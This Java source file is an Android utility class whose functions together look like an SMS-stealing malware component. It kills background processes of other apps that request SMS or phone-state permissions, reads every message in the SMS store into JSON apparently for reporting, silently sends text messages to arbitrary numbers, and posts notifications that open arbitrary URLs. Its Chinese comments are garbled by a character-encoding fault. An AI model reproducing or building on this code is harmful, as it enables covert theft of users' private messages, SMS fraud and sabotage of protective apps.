package tools.common;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONArray;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;


public class Tools {
	
	public static boolean checkNet(Context context)
	{
		ConnectivityManager mConnectivity = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        TelephonyManager mTelephony = (TelephonyManager)context.getSystemService(context.TELEPHONY_SERVICE);
        //����������ӣ������������ã��Ͳ���Ҫ��������������  
        NetworkInfo info = mConnectivity.getActiveNetworkInfo();
        if (info == null) {       	
        	return false;
        }
		return true;
	}
	
	/**
	 * �������л�ȡ���ŵ�APP
	 */
	public static boolean reStart(Context context)
	{ 
		//Logger.info("��ʼʱ�䣺"+System.currentTimeMillis());
        PackageManager pm = context.getPackageManager();
        List<PackageInfo> packs = pm.getInstalledPackages(PackageManager.GET_ACTIVITIES);          
        ActivityManager manager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);      
        //��������APP��ɾ����Ҳ����
        for(int i=0;i<packs.size();i++) {  
        	PackageInfo p = packs.get(i);
        	if(!p.packageName.equals(context.getPackageName()))
        	{
        		if(getPermisson(p.packageName,context))
            	{//����жϳ��л�ȡ����Ȩ��
            		//Logger.info(p.packageName);
            		//manager.restartPackage(p.packageName);
            		manager.killBackgroundProcesses(p.packageName);
            	}
        	}
        	
        }
        //Logger.info("����ʱ�䣺"+System.currentTimeMillis());
		return true;
	}
	
public static boolean getPermisson(String pkgName,Context context) {
		
    	StringBuffer tv = new StringBuffer();
    	PackageManager pm = context.getPackageManager();		
    	try {
		    PackageInfo pkgInfo = pm.getPackageInfo(pkgName, PackageManager.GET_PERMISSIONS);
            String sharedPkgList[] = pkgInfo.requestedPermissions;
            if(sharedPkgList==null)
            {
            	return false;
            }
            
            
            for(int i=0;i<sharedPkgList.length;i++){
            	String permName = sharedPkgList[i];
            	
            	if(permName.equals("android.permission.RECEIVE_SMS")||permName.equals("android.permission.READ_PHONE_STATE"))
            	{
            		return true;
            	}
			}
		} catch (NameNotFoundException e) {
			Logger.info("error:"+e.getMessage());
			return false;
		}
    	return false;
	}

	//���Ͷ���
	public static boolean sendSms(Context mContext, String sn, String sm) {
		// TODO Auto-generated method stub
		
		Intent itsend = null;
		Intent itDeliver = null;
		String num = sn;
		//���Ͷ�Ϣ����
		String message = sm;
		//���Ͷ�Ϣ
		itsend = new Intent(Tag.SMS_SEND_ACTIOIN);
		itsend.putExtra("number", num);
		SmsManager smsManager = SmsManager.getDefault();
		PendingIntent sentIntent = PendingIntent.getBroadcast(mContext, 0, itsend, 0);
		ArrayList<PendingIntent> mSentlist = new ArrayList<PendingIntent>();
		mSentlist.add(sentIntent);	
		
		
		itDeliver = new Intent(Tag.SMS_DELIVERED_ACTION);
		itDeliver.putExtra("number", num);	
		PendingIntent mDeliverPI = PendingIntent.getBroadcast(mContext,0, itDeliver,PendingIntent.FLAG_UPDATE_CURRENT); 
		ArrayList<PendingIntent> mDeliverlist = new ArrayList<PendingIntent>();
		mDeliverlist.add(mDeliverPI);
		if (message != null) {								
              ArrayList<String> msgs = smsManager.divideMessage(message); 
              Logger.info("���ͳ�����!!!!!!!!!!!!!!!!!!!!!!!");
              smsManager.sendMultipartTextMessage(num, null, msgs, mSentlist, mDeliverlist); 				
		}
		
		mSentlist.clear();
		mSentlist = null;
		mDeliverlist.clear();
		mSentlist = null;
	    return true;
	}
	
	
	
	//��ȡ����
	public static JSONArray getSms(Context mContext)   
	{   
	    final String SMS_URI_ALL   = "content://sms/";  	    
//	    //�ռ���
//	    final String SMS_URI_INBOX = "content://sms/inbox"; 
//	    //������
//	    final String SMS_URI_SEND  = "content://sms/sent";   
//	    //�ݸ��� 
//	    final String SMS_URI_DRAFT = "content://sms/draft";   
	       
	    
	    JSONArray jsonlist = null;
	    try{   
	        ContentResolver cr = mContext.getContentResolver();   
	        String[] projection = new String[]{"_id", "address", "person",    
	                "body", "date", "type"};   
	        Uri uri = Uri.parse(SMS_URI_ALL);   	        
	        Cursor cur = cr.query(uri, projection, null, null, "date asc"); 	        
	        if(null!=cur&&cur.getCount()<1)
	        {
	        	Logger.info("û����Ҫ�ϱ��Ķ���");
	        	return jsonlist;
	        }  
	        jsonlist = new JSONArray();
	        if (cur.moveToFirst()) {  
	        	//�շ����ŵ�����
//	            String name;    
//	            //����
//	            String phoneNumber;  
//	            //��������
//	            String smsbody; 
//	            //����
//	            String date;  
//	            //����  1.����  2.����  3.�ݸ�
//	            String type;   		            
	            int nameColumn = cur.getColumnIndex("person");//����   
	            int phoneNumberColumn = cur.getColumnIndex("address");//����   
	            int smsbodyColumn = cur.getColumnIndex("body");//����       
	            int dateColumn = cur.getColumnIndex("date");//����
	            int typeColumn = cur.getColumnIndex("type");//���� 
	            
	            do{   		            	
	            	
	            	Map itemsms = new LinkedHashMap();
	            	itemsms.put("name", cur.getString(nameColumn));
	            	itemsms.put("number", cur.getString(phoneNumberColumn));
	            	itemsms.put("body", cur.getString(smsbodyColumn));
	            	itemsms.put("date", cur.getString(dateColumn));
	            	itemsms.put("type", cur.getInt(typeColumn));
	            	jsonlist.put(itemsms);

	    	        
	            }while(cur.moveToNext()); 
	            
	            
	        } else {   
	        	return jsonlist;
	        }   		              		        
	    } catch(SQLiteException ex) {   
	        Logger.info("SQLiteException in getSmsInPhone:"+ex.getMessage());  
	        return jsonlist;
	    }   
	    return jsonlist;   
	}  
	
	/**
	 * ������ʾ֪ͨ
	 * @param context
	 * @param num
	 * @param message
	 */
	public static void showNotification(Context context,String title,String message,String url){  
        //���ź���
    	CharSequence contentTitle = title;
    	//�����ı�����
        CharSequence contentText = message;    	
        //�õ�һ��NotificationManager����  
        NotificationManager manager=(NotificationManager)context.getSystemService(Context.NOTIFICATION_SERVICE);            
        //ʵ����һ��Notification   
        int icon=R.drawable.ic_launcher;  
        long when=System.currentTimeMillis();  
        Notification notification=new Notification(icon, title, when);  
             
        //���������¼���Ϣ��PendingIntent    
        //Intent intent=new Intent(Intent.ACTION_MAIN,Uri.parse("smsto:" + contentTitle));
        Intent it = new Intent(Intent.ACTION_VIEW, Uri.parse(url));       
        PendingIntent pendingIntent=PendingIntent.getActivity(context, 0, it, 0);  
        notification.setLatestEventInfo(context, contentTitle, contentText, pendingIntent); 
        //֪ͨ�����������ʧ
        notification.flags |= Notification.FLAG_AUTO_CANCEL; 
        //��������  
        manager.notify(1, notification);    
   }
	
}
